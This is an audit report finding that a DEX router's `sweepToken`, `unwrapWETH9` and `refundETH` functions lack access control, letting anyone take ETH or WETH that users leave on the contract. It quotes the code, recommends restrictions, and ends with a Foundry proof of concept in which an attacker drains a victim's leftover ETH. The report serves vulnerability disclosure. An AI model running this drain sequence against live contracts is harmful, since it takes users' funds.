Audit Report

## Title
Unguarded `sweepToken` / `refundETH` / `unwrapWETH9` Allow Any Caller to Drain Router-Held ETH and ERC-20 Balances — (File: `metric-periphery/contracts/base/PeripheryPayments.sol`)

## Summary
`sweepToken`, `unwrapWETH9`, and `refundETH` in `PeripheryPayments.sol` carry no caller restriction. The router legitimately holds ETH between multicall steps (excess native ETH sent for WETH swaps) and WETH directed to `address(router)` for unwrapping. Any external caller can invoke these functions after a victim's transaction settles to redirect the full balance to an arbitrary address. A secondary vector in `pay` silently consumes leftover ETH from a prior user during the next WETH swap, draining stranded funds without any sweep call.

## Finding Description
`refundETH` is declared `external payable` with no access control and unconditionally transfers the router's entire ETH balance to `msg.sender`:

```solidity
// PeripheryPayments.sol L58-63
function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
        _transferETH(msg.sender, balance);
    }
}
```

`sweepToken` and `unwrapWETH9` are `public payable` with no access control and transfer the router's full token/WETH balance to a caller-supplied `recipient`:

```solidity
// PeripheryPayments.sol L48-55
function sweepToken(address token, uint256 amountMinimum, address recipient) public payable override {
    uint256 balanceToken = IERC20(token).balanceOf(address(this));
    ...
    if (balanceToken > 0) {
        IERC20(token).safeTransfer(recipient, balanceToken);
    }
}
```

ETH is stranded on the router when a user sends excess `msg.value` with a multicall (e.g., 2 ETH for a 1 000-wei WETH swap) and omits `refundETH` from the call array. The test suite confirms this is the expected user flow — `refundETH` is an optional trailing call that users must remember to include. WETH is stranded when a user directs swap output to `address(router)` for unwrapping but omits `unwrapWETH9`.

The `pay` function compounds the issue: it consumes the router's native ETH balance **before** pulling from the payer, so leftover ETH from a prior user is silently spent by the next WETH swap:

```solidity
// PeripheryPayments.sol L73-84
} else if (token == WETH) {
    uint256 nativeBalance = address(this).balance;
    if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
    } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        ...
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
    }
```

No existing guard prevents an unprivileged caller from invoking any of these three functions at any time.

## Impact Explanation
Direct loss of user principal. A user who sends excess ETH with a multicall and omits `refundETH` loses that ETH to the first caller who notices. WETH output directed to the router for unwrapping can be swept by anyone to any `recipient`. The `pay` function's ETH-first logic silently drains stranded ETH during subsequent legitimate swaps without requiring the attacker to call any sweep function. This meets the Sherlock threshold for direct loss of user principal at Critical/High severity.

## Likelihood Explanation
Medium-to-High. The test suite (`test_multicall_ethInput_exactInputSingle_refundsUnusedEth`) demonstrates the exact pattern where users send excess ETH and must include `refundETH` as a separate call — omitting it is a realistic user error. MEV bots routinely monitor for unprotected sweep functions on router contracts. The attack requires no special permissions, no setup, and is executable by any EOA in a follow-up transaction.

## Recommendation
Restrict `sweepToken`, `unwrapWETH9`, and `refundETH` so they can only be invoked by the originating multicall sender. One approach: record `msg.sender` in transient storage at the start of each top-level `multicall` entry and require that the same address calls any sweep/refund within the same transaction. Alternatively, remove the arbitrary `recipient` parameter from `sweepToken` and `unwrapWETH9`, forcing transfers only to `msg.sender` (mirroring `refundETH`). At minimum, add a `checkDeadline`-style modifier that enforces the caller is the original depositor.

## Proof of Concept
```solidity
// User A sends 2 ETH for a 1 000-wei WETH swap, forgets refundETH
vm.deal(userA, 2 ether);
vm.prank(userA);
bytes[] memory calls = new bytes[](1); // missing refundETH call
calls[0] = abi.encodeWithSelector(
    router.exactInputSingle.selector,
    IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool: address(pool), tokenIn: address(weth), tokenOut: address(token1),
        zeroForOne: true, amountIn: 1_000, amountOutMinimum: 0,
        recipient: userA, deadline: block.timestamp + 1, priceLimitX64: 0, extensionData: ""
    })
);
router.multicall{value: 2 ether}(calls);
// ~2 ether - 1_000 wei remains on router

// Attacker drains it with a single permissionless call
uint256 before = attacker.balance;
vm.prank(attacker);
router.refundETH();
assertGt(attacker.balance, before); // userA's ETH stolen

// OR attacker drains stranded WETH via sweepToken
vm.prank(attacker);
router.sweepToken(address(weth), 0, attacker);
```

The test at `metric-periphery/test/MetricOmmSimpleRouter.native.t.sol` L106-133 confirms the exact precondition (excess ETH sent, `refundETH` as an optional trailing call) and that `_assertRouterEmpty()` only passes when `refundETH` is included.
